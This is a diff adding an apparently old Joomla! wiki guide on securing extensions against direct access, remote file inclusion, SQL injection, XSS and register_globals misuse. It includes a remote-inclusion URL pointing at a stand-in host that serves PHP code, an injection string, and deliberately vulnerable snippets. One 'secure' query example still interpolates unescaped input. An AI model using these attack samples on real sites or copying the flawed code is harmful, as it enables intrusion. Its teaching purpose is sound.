@@ -1,0 +1,324 @@
+====== How to make your Joomla! addon more secure  WIP ======
+
+By default, Joomla! is very secure. Especially with the coming Joomla! 1.5 release, security will again be improved. While most core components are safe and secure, often hackers get into the system by using third party extensions. This article is targeted at giving you an easy guide for making your extension as safe as possible.
+
+**
+We strongly recommend using these functions to ensure maximum security.**
+
+====== Intro: Guide to more secure Components/Modules/Plugins... ======
+Are you a third party developer for Joomla! addons? Do you publish your programs on the Joomla! forge or on your website? Well, thank you for doing that, the community probably loves you for sharing your work!
+
+However, there are a few things in terms of security that you should be aware of. Just having a component that runs fine on your computer is usually not enough! You need to take care of security, because otherwise your programm could easily ruin the websites of your customers.
+
+So, lets just jump right into it. These are the topics I will deal with in this guide:
+
+    - Secure your software against direct access
+    - Secure your software against remote file inclusion
+    - Secure your software against SQL injections
+    - Secure your software against XSS scripting
+    - Make sure your software does not need register_globals
+    - Check access privileges of users
+    - How to achieve raw component output (for pictures, RSS-feeds etc.)
+    - Various things to be aware of
+
+Please note that when I refer to components, I also mean modules, plugins (formerly mambots) and templates as well. All code examples in this guide are written for Joomla! 1.0.x and Joomla! 1.5.x.
+
+====== 1. Secure your software against direct access ======
+The files of your component will usually be called by Joomla!. Joomla! is a wrapper around your software, it provides many usefull features like user authentication and so on. Since developers usually test their components only through Joomla!, they tend to forget about the possibility of calling files directly. Instead of calling your component by
+
+<code php>
+http:/ /www.example.com/index.php?option=com_yourcomponent
+</code>
+crackers also might try to use// // 
+<code php>
+http:/ /www.example.com/components/com_yourcomponent/yourcomponent.php
+</code>
+
+As you can see, the PHP file will be executed directly, without Joomla! as a wrapper around it. Now, if your file only contains some classes or functions, but does not execute any code, there is nothing wrong about that:
+
+<code php|Example class>
+<?php
+ class myClass {
+     [SomeFunctionsHere]
+ }
+ function myFunction() {
+     [SomeCodeHere]
+ }
+ ?>
+</code>
+
+The cracker would just see an empty page when accessing your file directly. But if that PHP file actually executes anything, he would probably see a bunch of error messages, revealing important details of your system. Under some circumstances, he might also be able to execute any code he wants to, on your system!
+
+**Conclusion:**
+ 
+To make your component secure against direct access, insert this code line into the beginning of every PHP file that executes code:
+
+<code php|Joomla 1.0>
+// no direct access
+defined( '_VALID_MOS' ) or die( 'Restricted access' );
+</code>
+
+<code php|Joomla 1.5>
+// no direct access
+defined('_JEXEC') or die('Restricted access');
+</code>
+
+This is a MUST for every file that executes PHP code. If you are in doubt whether your file executes code, do use this line!
+
+====== 2. Secure your software against remote file inclusion ======
+Now imagine, you have a line like this one in your code:
+
+<code php|Joomla 1.0>
+include( $mosConfig_absolute_path . '/components/com_yourcomponent/yourcomponent.class.php' );
+</code>
+
+Furthermore, imagine that a cracker tries to access your file as
+
+<code php>
+http://www.example.com/components/com_yourcomponent/yourcomponent.php?
+mosConfig_absolute_path=http://www.bad.site/bad.gif?
+</code>
+and actually sends back executable PHP code under the filename of that image. That code then is executed (assuming that register_globals is switched on in your webserver, which unfortunaltely is the case for many people) in your or your customers webserver with the permissions of the webserver. The attacker can do anything he wants to do (and what the webserver is allowed for) on your webserver! This is called remote file inclusion. Unfortunately, this is something even script kiddies can do easily.
+There are also some more advanced technics out there that allow for remote file inclusion in some PHP versions even if you have switched register_globals off. Remote file inclusion only works on systems that have the PHP setting allow_url_fopen switched to on. But as this option is needed by many "good" programs as well, switching it off is not always a good idea.
+
+**Conclusion:** // //
+To secure your code against remote file inclusion, you need to make sure no unvalidated input is used when including files. At first, apply the solution from part 1 of this guide. Secondly, be very carefull with all calls to functions dealing with the file system, especially e.g. include, require, include_once, require_once, fopen. If you really need to include files with variable names, make sure to validate all these variables.
+
+A good practice to include files is using constants [2.2]:
+
+<code php|Joomla 1.0>
+define( 'YOURBASEPATH', dirname(__FILE__) );
+ require_once( YOURBASEPATH . '/file_to_include.php' );
+</code>
+
+<code php|Joomla 1.5>
+define( 'YOURBASEPATH', dirname(__FILE__) );
+ require_once( YOURBASEPATH . '/file_to_include.php' );
+</code>
+
+As this uses no variables at all, there is no chance for a cracker to open files from remote servers.
+
+====== 3. Secure your software against SQL injections ======
+SQL injections make it possible for attackers to modify certain unsafe SQL queries, your script executes, in such a way that it could alter data in your database or give out sensible data to the attacker. That is because of unvalidated user input.
+
+Take a look at this code:
+
+<code php|Joomla 1.0>
+$value = $_GET['value'];
+ $database->setQuery( "SELECT * FROM #__mytable WHERE id = $value" );
+</code>
+
+An attacker could hand over a string like '1 OR 1', the query results in <code php>"SELECT * FROM #__mytable WHERE id = 1 OR 1"</code>, thus returning all rows from jos_mytable. I'm not going more into detail here, as SQL injections are covered quite good on the web. Please take a look at the resources listed at the bottom of this post.
+
+**Conclusion:** // //
+Validate all user input before you use it in a SQL query. Apply
+
+<code php|Joomla 1.0>
+$string = $database->getEscaped( $string );
+</code>
+
+<code php|Joomla 1.5>
+$string = $db->getEscaped( $string );
+</code>
+
+to all strings that will be used in SQL queries, and apply
+
+<code php|Joomla 1.0>
+$value = intval( $value );
+</code>
+
+<code php|Joomla 1.5>
+$value = intval( $value );
+</code>
+
+to all integer numbers you use in SQL queries.
+Again, for more information on SQL injections, please take a look at the listed resources, especially [3.2].
+
+Also, make sure to use mosGetParam() [5.5] for retrieving user input from the request, e.g.:
+
+<code php|Joomla 1.0>
+$value = mosGetParam( $_POST, 'value' );
+ $value = mosGetParam( $_POST, 'value', 'default' );	// This will return 'default'
+							// when $_POST['value'] is not set.
+</code>
+
+mosGetParam will return escaped values, independantly of PHP's magic_quotes_gpc setting.
+
+**Warning:**mosGetParam (and quotes escaping) is not protecting against some injections for numbers. You must convert the variable to an int with inval($var) or (int) $var in order to prevent those injections.
+
+In Joomla! 1.5 use JRequest::getvar(), e.g.:
+
+<code php|Joomla 1.5>
+$value 	= JRequest::getVar( 'value', '', 'post', string );
+$value  = JRequest::getVar( 'value', 'default', 'post', string );	// This will return
+						// 'default' when $_POST['value'] is not set.
+</code>
+
+JRequest::getVar will return **__unescaped__** values, independantly of PHP's magic_quotes_gpc setting. In Joomla! 1.5, due to UTF-8 support, the Framework rule is that variables in the code are unescaped, and proper database escaping must be applied at database request time with $db->getEscaped( $string ) or using the object-methods save() which do the proper escaping.
+
+====== 4. Secure your software against XSS ======
+Cross Site Scripting (XSS) means executing script code (e.g. JavaScript) in a visitors browser. Be carefull not to echo out any unvalidated input to a user. Code like this is dangerous for your visitors:
+
+<code php|Joomla 1.0>
+echo $_REQUEST['value'];
+</code>
+
+**Conclusion:** // //
+Use mosGetParam() [5.5] for retrieving user input from a request, it does strip out a pretty good amount of insecure stuff. But don't rely on it, also take a good look at places where you echo out things to the webbrowser. Apply
+
+<code php|Joomla 1.0>
+$value = htmlspecialchars( $value );
+</code>
+
+to strings before you echo them out to the browser.
+
+
+====== 5. Make sure your software does not need register_globals ======
+Up to now, there are many programs that rely on register_globals being set to ON. PHP then imports all $_GET, $_POST, $_COOKIE data and some other variables into the global scope. When people program things correctly, there is not neccessarily anything wrong about it. But unfortunaltely there are very many programs out there using global variables in an insecure way. This might open up serious security holes. Therefore, users are advised to switch off register_globals, and more and more hosting companies do so for security reasons.
+
+You should never use any uninstantiated variables. Make sure to properly fill each variable before using it. To check whether your component is capable of running without register_globals, you should do the following:
+
+    * Enable error reporting in PHP to see notices. This will give you some hints on which variables are used without prior initialization.
+    * Set register_globals to off in your php.ini.
+    * Set RG_EMULATION to 0 in globals.php in your Joomla! root folder.
+
+
+Also, it is a bad practice to access variables like this (read resource [5.4] for more technical details):
+
+<code php|Joomla 1.0>
+echo $GLOBALS['varname'];
+</code>
+
+You should rather use this:
+
+<code php|Joomla 1.0>
+global $varname;
+ echo $varname;
+</code>
+
+====== 6. Check access privileges of users ======
+When giving access to certain components (or to certain database table rows) you might want to make sure that only registered or special users can access it. I'm not going into any ACL related issues here, I rather want to give you a short overview on how to distinguish guest, registered (and logged in) users, and special users (by default all users below Registered, meaning Authors, Publishers etc.).
+
+Joomla! provides (again, only in in 1.0.x) the $my object which holds information about the current user. These are the settings for the different access types (only applies to the frontend):
+
+    * $my->gid = 0 ==> the user is not logged in
+    * $my->gid = 1 ==> the user is a registered user
+    * $my->gid = 2 ==> the user is a special user
+
+
+**Conclusion:**// //
+You can check these values to block access to certain parts of your component.
+
+Also, make sure not to present any information to a user he does not have access to. A simple SQL query that takes into account the permissions of the category for a certain databse entry (assuming your data is sorted into categories) might look like this:
+
+<code php|Joomla 1.0>
+SELECT * FROM #__contact_details AS c
+ LEFT JOIN #__categories AS cat ON cat.id = c.catid
+ WHERE ( c.name LIKE '%$text%' )
+ AND c.published = 1
+ AND cat.published = 1
+ AND c.access <= $my->gid
+ AND cat.access <= $my->gid
+</code>
+
+<code php|Joomla 1.5>
+// Initialize variables as example how to get the current user
+$app	= & $this->getApplication();
+$user	= & $app->getUser();
+
+SELECT * FROM #__contact_details AS c
+ LEFT JOIN #__categories AS cat ON cat.id = c.catid
+ WHERE ( c.name LIKE '%$text%' )
+ AND c.published = 1
+ AND cat.published = 1
+ AND c.access <= $user->get('gid')
+ AND cat.access <= $user->get('gid')
+</code>
+
+Note that both the contact details and the category are checked for being published and for being within the users access level.
+
+
+====== 7. How to achieve raw component output (for pictures, RSS-feeds etc.) ======
+In some cases, users need to send out raw data (no Joomla! template around it) to the browser, for example binary pictures or XML data for RSS feeds. Developers tend to write their own entry point PHP files, but this should only be a last resort. It is better to let Joomla! handle things.
+
+**Conclusion:** // //
+You should add a new function to your component (and to the switch statement that handles the selected $task). Then, call your component like this:
+
+<code php|>
+http:/ /www.example.com/index2.php?option=com_yourcomponent&task=your_task&no_html=1
+</code>
+
+If you really need to provide an entry point – a file that might be called directly – make sure to take care of part 2 of this guide. Secondly, the first thing you should do in your code is to include Joomla!'s globals.php (and if needed, Joomla!'s configuration.php).
+
+<code php|Joomla 1.0>
+define( 'YOURBASEPATH', dirname(__FILE__) );
+ require_once( YOURBASEPATH . '/../../globals.php' );
+ require_once( YOURBASEPATH . '/../../configuration.php' );
+</code>
+
+Again, you are advised to not provide your own entry point, and if you do, be very carefull with it.
+
+====== 8. Various things to be aware of ======
+There are some more things you should not do, and also some functions you should not use at all.
+
+    * Don't use eval(). eval() is evil! Tongue
+    * Don't use the backtick operator [8.2], exec, shell_exec, system, popen and such functions
+    * Don't automatically send out an email to you whenever your component becomes installed somewhere. This will give you a bad reputation!
+    * We should never ever see the use of @$_GET or @$_POST, etc, in the code
+
+
+
+
+====== Resources ======
+
+=====1. Secure your software against direct access=====
+
+    * No resources so far.
+
+
+=====2. Secure your software against remote file inclusion=====
+
+    * http://www.owasp.org/index.php/PHP_Top_5#P1:_Remote_Code_Execution
+    * http://dev.joomla.org/index.php?option=com_jd-wiki&Itemid=31&id=faq:path_constants For Joomla! 1.5
+
+
+=====3. Secure your software against SQL injections=====
+
+    * http://en.wikipedia.org/wiki/Sql_injection
+    * http://php.net/manual/en/security.database.sql-injection.php
+    * http://www.owasp.org/index.php/PHP_Top_5#P3:_SQL_Injection
+   
+
+=====4. Secure your software against XSS scripting=====
+
+    * http://en.wikipedia.org/wiki/XSS
+    * http://www.owasp.org/index.php/Cross_Site_Scripting
+    * http://www.owasp.org/index.php/PHP_Top_5#P2:_Cross-site_scripting
+    * http://php.net/manual/en/function.htmlspecialchars.php
+
+
+=====5. Make sure your software does not need register_globals=====
+
+    * http://php.net/manual/en/function.error-reporting.php Make sure your level for error_reporting includes E_NOTICE
+    * http://php.net/manual/en/ini.core.php#ini.register-globals
+    * http://php.net/manual/en/language.variables.predefined.php
+    * http://www.hardened-php.net/index.76.html
+    * http://forum.joomla.org/index.php/topic,15691.0.html
+
+
+=====6. Check access privileges of users=====
+
+    * No resources so far.
+
+
+=====7. How to achieve raw component output (for pictures, RSS-feeds etc.)=====
+
+    * No resources so far.
+
+
+=====8. Various things to be aware of=====
+
+    * http://www.owasp.org/index.php/PHP_Top_5#How_to_Determine_if_you_are_Vulnerable
+    * http://php.net/manual/en/language.operators.execution.php
+
+[[:start|Back to the Startpage]]
